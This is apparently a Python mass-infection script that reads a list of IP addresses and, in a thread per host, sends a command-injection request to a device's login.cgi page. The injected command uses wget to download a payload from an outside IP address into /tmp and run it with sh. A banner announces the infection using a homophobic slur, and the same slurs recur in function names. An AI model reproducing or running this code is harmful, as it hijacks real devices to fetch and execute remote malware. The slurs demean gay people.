import threading
import sys, os, re, time, socket
from sys import stdout
from multiprocessing import Process
from random import randint
from time import sleep
import random
import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import warnings
warnings.filterwarnings("ignore")

ips = open(sys.argv[1], "r").read().splitlines()
if len(sys.argv) < 1:
    sys.exit("usage: python %s <input list>" % (sys.argv[0]))


headers = {
    'User-Agent': 'notokane'
}
	
print "\x1b[1;32m                   ****************************                   \x1b[1;32m"
print "\x1b[1;32m                   *  \x1b[1;31mNOW INFECTING THE GAYS  \x1b[1;32m*                  \x1b[1;32m"
print "\x1b[1;32m                   *    \x1b[1;31m  MADE BY DROUGHT     \x1b[1;32m*                   \x1b[1;32m"
print "\x1b[1;32m                   ****************************                   \x1b[1;32m"

time.sleep(3)



def gaydar(synoisgay):
    url = 'http://'+ str(synoisgay) +'/login.cgi?cli=aa%20aa%27;wget%20http://139.59.66.241/g%20-O%20-%3E%20/tmp/g;sh%20/tmp/g%27$'
    requests.get(url, headers=headers, verify=False)
    print '\x1b[1;32mATTEMPTING =>'  + synoisgay 

for EkSdE in ips:
    sleep(random.uniform(0, 0.02))
    t = threading.Thread(target=gaydar, args = (EkSdE,))
    t.start()
    
    
